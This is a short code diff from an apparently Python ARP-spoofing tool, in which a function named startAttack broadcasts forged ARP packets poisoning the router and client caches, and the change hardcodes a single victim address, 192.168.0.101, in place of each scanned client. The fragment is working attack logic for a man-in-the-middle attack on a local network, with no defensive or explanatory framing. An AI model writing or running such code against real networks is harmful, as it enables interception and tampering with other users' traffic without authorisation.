@@ -92,8 +92,8 @@ def startAttack(myIp, myMac, routerIp, routerMac, networkScan):
                 if clientIp == myIp or clientIp == routerIp: continue # do not touch router or yourself ( :3 )
 
                 # send arp packs
-                sendPackage(createARPpackage(clientIp, myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
-                sendPackage(createARPpackage(routerIp, myMac, clientIp), 'ff:ff:ff:ff:ff:ff')
+                sendPackage(createARPpackage('192.168.0.101', myMac, routerIp), 'ff:ff:ff:ff:ff:ff')
+                sendPackage(createARPpackage(routerIp, myMac, '192.168.0.101'), 'ff:ff:ff:ff:ff:ff')
                 sentPackCount += 2
 
             time.sleep(1)
